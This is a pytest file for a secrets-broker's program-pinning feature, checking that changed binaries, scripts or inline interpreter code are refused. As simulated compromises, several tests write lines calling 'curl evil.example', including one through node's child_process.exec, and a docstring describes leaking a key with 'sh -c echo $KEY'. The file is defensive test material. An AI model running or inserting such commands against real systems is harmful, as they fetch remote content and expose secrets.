# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Rizzma, Inc.
"""Pinning: is this the same code you approved?

The feature these hold up exists because the obvious one does not work. "Refuse
anything unsigned" was measured on a real machine first: at a permissive
requirement `/bin/sh`, `/usr/bin/python3` and every `node` pass, and at a strict
one the survivors are one vendor's binaries — including a bundled `node` that
runs whatever it is handed — while PassBook's own ad-hoc-signed interpreter is
refused. So the strict setting locks out the tool doing the enforcing and admits
the universal bypass.

What is tested here is the question that survived: not who compiled a program,
but whether it is the same code as last time.
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

import passbook_access as access  # noqa: E402
import passbook_grant as grant  # noqa: E402
import passbook_identity as identity  # noqa: E402

DARWIN = sys.platform == "darwin"
needs_codesign = pytest.mark.skipif(not DARWIN, reason="codesign is a macOS tool")


@pytest.fixture
def program(tmp_path):
    """A file standing in for a program. Identification never execs it."""
    path = tmp_path / "deploy-tool"
    path.write_bytes(b"#!/bin/sh\necho v1\n")
    path.chmod(0o755)
    return path


# ── what an identity is ────────────────────────────────────────────────────


def test_a_program_with_no_authority_is_identified_by_its_contents(program):
    record = identity.identify([str(program)])
    assert record["status"] == "identified"
    assert record["program_id"].startswith("sha256:")
    assert record["identities"] == [record["program_id"]]


def test_changing_a_program_changes_its_identity(program):
    """The whole point, and the thing a signature cannot see.

    A pattern like `deploy-tool *` keeps matching after `deploy-tool` has become
    different code, which is the supply-chain case: a dependency takes a
    compromised update and silently keeps the access it was granted.
    """
    before = identity.identify([str(program)])["program_id"]
    program.write_bytes(b"#!/bin/sh\ncurl evil.example\n")
    after = identity.identify([str(program)])["program_id"]
    assert before != after


def test_a_missing_program_is_unknown_rather_than_allowed(tmp_path):
    record = identity.identify([str(tmp_path / "nothing-here")])
    assert record["status"] == "unknown"
    assert record["identities"] == []


@needs_codesign
def test_an_apple_binary_is_identified_by_its_authority():
    record = identity.identify(["/bin/echo", "hi"])
    assert record["status"] == "identified"
    assert record["program_id"].startswith("apple:")


@needs_codesign
def test_an_adhoc_signature_is_not_an_identity(tmp_path):
    """`codesign -v` passes on one, and minting one costs a single command.

    No account, no certificate, no review — so treating ad-hoc as "signed"
    would put the green tick on anything at all, including the binary an
    attacker just built.
    """
    import shutil
    import subprocess

    binary = tmp_path / "adhoc"
    shutil.copy("/bin/echo", binary)
    done = subprocess.run(["/usr/bin/codesign", "-f", "-s", "-", str(binary)],
                          capture_output=True)
    if done.returncode != 0:
        pytest.skip("this machine will not ad-hoc sign")

    # It verifies. That is exactly why validity is the wrong question.
    assert subprocess.run(["/usr/bin/codesign", "-v", "--strict", str(binary)],
                          capture_output=True).returncode == 0
    assert identity.signature(binary)["status"] == "unsigned"
    assert identity.program_id(binary)["id"].startswith("sha256:")


# ── interpreters ───────────────────────────────────────────────────────────


def test_a_script_is_part_of_the_identity(tmp_path):
    """The pair signatures could never express: interpreter AND the code it runs."""
    script = tmp_path / "server.js"
    script.write_text("console.log(1)\n")
    interpreter = tmp_path / "node"
    interpreter.write_bytes(b"binary")

    record = identity.identify([str(interpreter), str(script)])
    assert record["status"] == "identified"
    assert len(record["identities"]) == 2
    assert record["script"] == str(script)


def test_changing_the_script_changes_the_identity(tmp_path):
    script = tmp_path / "server.js"
    script.write_text("console.log(1)\n")
    interpreter = tmp_path / "node"
    interpreter.write_bytes(b"binary")

    before = identity.identify([str(interpreter), str(script)])["identities"]
    script.write_text("require('child_process').exec('curl evil.example')\n")
    after = identity.identify([str(interpreter), str(script)])["identities"]
    assert before != after
    # The interpreter did not change, so exactly one of the two moved.
    assert len(set(before) & set(after)) == 1


@pytest.mark.parametrize("argv", [
    ["node", "-e", "console.log(1)"],
    ["sh", "-c", "curl evil.example"],
    ["python3", "-c", "import os"],
    ["bash", "-c", "x"],
], ids=["node-e", "sh-c", "python-c", "bash-c"])
def test_inline_code_cannot_be_identified(argv):
    record = identity.identify(argv)
    assert record["status"] == "ambiguous"


def test_an_ambiguous_command_carries_no_identities():
    """It must fail closed for a caller that forgets to read `status`.

    `set(identities) <= pinned` is the obvious way to check a pin. If an
    ambiguous record still carried the interpreter's identity, `node -e
    '<anything>'` would satisfy a pin taken on `node server.js` — the exact
    overstatement this module exists to avoid.
    """
    assert identity.identify(["node", "-e", "x"])["identities"] == []


def test_a_bare_interpreter_reading_stdin_is_ambiguous():
    assert identity.identify(["python3"])["status"] == "ambiguous"
    assert identity.identify(["sh", "-"])["status"] == "ambiguous"


def test_a_versioned_interpreter_is_still_an_interpreter():
    """`python3` here is a symlink to `python3.14`, and `resolve` follows it.

    Matching the literal name meant the resolved file stopped looking like an
    interpreter, so a bare `python3` — which reads its program from stdin —
    came back `identified` and could be pinned as though it were a fixed
    program.
    """
    assert identity.is_interpreter("python3.14")
    assert identity.is_interpreter("perl5.34.0")
    assert identity.is_interpreter("node")
    assert not identity.is_interpreter("deploy-tool")


# ── resolution ─────────────────────────────────────────────────────────────


def test_resolution_follows_the_path_it_is_given(tmp_path):
    """`subprocess` resolves a bare name against the environment it is GIVEN.

    Resolving against the broker's own PATH instead would identify one file and
    then run another, which is worse than not checking at all.
    """
    elsewhere = tmp_path / "bin"
    elsewhere.mkdir()
    probe = elsewhere / ("zzprobe.exe" if os.name == "nt" else "zzprobe")
    probe.write_bytes(b"x")
    # Executable, because a PATH lookup only finds what `exec` could run — the
    # same check `shutil.which` makes and the same one the kernel will.
    probe.chmod(0o755)

    assert identity.resolve("zzprobe", path=str(elsewhere)) is not None
    assert identity.resolve("zzprobe", path=str(tmp_path / "empty")) is None


def test_a_relative_program_resolves_against_the_childs_directory(tmp_path):
    (tmp_path / "tool").write_bytes(b"x")
    assert identity.resolve("./tool", cwd=str(tmp_path)) is not None


# ── the policy ─────────────────────────────────────────────────────────────


def test_an_app_nobody_pinned_may_run_anything(program):
    verdict = grant.identity_allowed("app", [str(program)], {})
    assert verdict["allowed"] and verdict["why"] == "not pinned"


def test_a_pinned_app_may_run_what_it_was_pinned_to(program):
    policy = {}
    access.add_pin("app", identity.identify([str(program)])["identities"], policy)
    assert grant.identity_allowed("app", [str(program)], policy)["allowed"]


def test_a_pinned_app_is_refused_after_its_program_changes(program):
    policy = {}
    access.add_pin("app", identity.identify([str(program)])["identities"], policy)
    program.write_bytes(b"#!/bin/sh\ncurl evil.example\n")

    verdict = grant.identity_allowed("app", [str(program)], policy)
    assert not verdict["allowed"]
    assert "not the code that was pinned" in verdict["why"]


def test_a_pinned_app_is_refused_inline_code_from_a_trusted_interpreter(tmp_path):
    """The bypass that makes signature checking pointless, closed by pinning.

    A pin taken on `node server.js` trusts that node. If trust in the
    interpreter carried to whatever it was handed, `node -e '<anything>'` would
    walk straight through — which is what a signature check does and why it is
    not a boundary.
    """
    script = tmp_path / "server.js"
    script.write_text("console.log(1)\n")
    policy = {}
    access.add_pin("app", identity.identify(["node", str(script)])["identities"], policy)

    verdict = grant.identity_allowed("app", ["node", "-e", "console.log(1)"], policy)
    assert not verdict["allowed"]
    assert "cannot be pinned" in verdict["why"]


def test_turning_a_pin_off_stops_it_refusing_without_losing_the_list(program):
    policy = {}
    access.add_pin("app", identity.identify([str(program)])["identities"], policy)
    kept = access.pin_for("app", policy)["identities"]

    access.set_pin_mode("app", "off", policy)
    program.write_bytes(b"different")
    assert grant.identity_allowed("app", [str(program)], policy)["allowed"]
    assert access.pin_for("app", policy)["identities"] == kept


def test_pinning_is_additive(tmp_path):
    """A pin is built one command at a time; replacing the set would turn every
    addition into a silent narrowing discovered when something stops working."""
    first, second = tmp_path / "one", tmp_path / "two"
    first.write_bytes(b"1")
    second.write_bytes(b"2")
    policy = {}
    access.add_pin("app", identity.identify([str(first)])["identities"], policy)
    access.add_pin("app", identity.identify([str(second)])["identities"], policy)

    assert len(access.pin_for("app", policy)["identities"]) == 2
    assert grant.identity_allowed("app", [str(first)], policy)["allowed"]
    assert grant.identity_allowed("app", [str(second)], policy)["allowed"]


def test_a_pin_survives_a_policy_round_trip(tmp_path, monkeypatch):
    """`write_policy` names its sections literally and carries the rest through.

    It has dropped an unlisted section before — `agents set` printed a new
    audience, wrote a file without it, and the next read said "every agent".
    """
    monkeypatch.setenv("HIVE_HOME", str(tmp_path))
    policy = access.read_policy()
    access.add_pin("app", ["sha256:abc"], policy)
    access.write_policy(policy)

    assert access.pin_for("app", access.read_policy())["identities"] == ["sha256:abc"]


def test_a_pin_cannot_be_enforced_before_anything_is_pinned():
    with pytest.raises(ValueError):
        access.set_pin_mode("app", "pinned", {})


def test_identification_missing_refuses_rather_than_ignoring(program, monkeypatch):
    """The owner turned this on. A missing module silently reverting that is the
    same failure as a policy writer dropping a section it did not recognise."""
    policy = {}
    access.add_pin("app", ["sha256:whatever"], policy)
    monkeypatch.setitem(sys.modules, "passbook_identity", None)

    verdict = grant.identity_allowed("app", [str(program)], policy)
    assert not verdict["allowed"]
    assert "not installed" in verdict["why"]


# ── the command a person actually types ────────────────────────────────────


def test_a_pinned_app_is_sent_to_the_broker_rather_than_exec_locally(tmp_path, monkeypatch):
    """`passbook run` execs the child itself unless something sends it to the
    broker, and the pin is checked at the broker.

    So the first version held for every caller except the one that matters. It
    passed its broker tests, and the first time it was run from a shell the
    replaced program ran anyway and `sh -c 'echo $KEY'` printed the value.
    Reads were open and no key was guarded, so `run` never made the round trip.
    """
    import argparse

    import passbook_broker
    import passbook_cli

    monkeypatch.setenv("HIVE_HOME", str(tmp_path))
    monkeypatch.delenv("HIVE_ENV_FILES", raising=False)
    policy = access.read_policy()
    access.add_pin("demo", ["sha256:whatever"], policy)
    access.write_policy(policy)
    assert access.read_policy().get("reads") != "sealed", "this must test the OPEN case"

    asked = {}
    monkeypatch.setattr(passbook_broker, "running", lambda *a, **k: True)
    monkeypatch.setattr(passbook_broker, "spawn_streaming",
                        lambda *a, **k: asked.setdefault("yes", True) and
                        {"ok": True, "exit_code": 0, "begin": {}})

    args = argparse.Namespace(only=["ALPHA"], app="demo")
    outcome = passbook_cli._sealed_run(["/bin/echo", "hi"], "demo", args)

    # Not None: None means "fall through and exec it here", which is the bug.
    assert outcome is not None
    assert asked.get("yes"), "the pinned app never reached the broker"


def test_a_machine_with_no_broker_is_not_stranded_by_a_pin(tmp_path, monkeypatch, capsys):
    """The standard is explicit: a policy is enforced BY a broker, and a machine
    without one is never locked out by one.

    Refusing here would also protect nothing. On a store this process can
    already read, the values flow as they always did; the program a pin guards
    against does not stop the broker, and a person who does could read the store
    directly. So it runs — and says so, because implying a check that did not
    happen is the one unacceptable outcome.
    """
    import argparse

    import passbook_broker
    import passbook_cli

    monkeypatch.setenv("HIVE_HOME", str(tmp_path))
    monkeypatch.delenv("HIVE_ENV_FILES", raising=False)
    policy = access.read_policy()
    access.add_pin("demo", ["sha256:whatever"], policy)
    access.write_policy(policy)
    monkeypatch.setattr(passbook_broker, "running", lambda *a, **k: False)

    args = argparse.Namespace(only=["ALPHA"], app="demo")
    assert passbook_cli._sealed_run(["/bin/echo", "hi"], "demo", args) is None
    assert "no broker" in capsys.readouterr().err


def test_an_unpinned_app_still_takes_the_fast_path(tmp_path, monkeypatch):
    """Filtering a stream costs a pipe and two threads where an exec costs
    nothing. A machine that asked for nothing should not pay for it."""
    import argparse

    import passbook_cli

    monkeypatch.setenv("HIVE_HOME", str(tmp_path))
    monkeypatch.delenv("HIVE_ENV_FILES", raising=False)
    access.write_policy(access.read_policy())

    args = argparse.Namespace(only=["ALPHA"], app="other")
    assert passbook_cli._sealed_run(["/bin/echo", "hi"], "other", args) is None
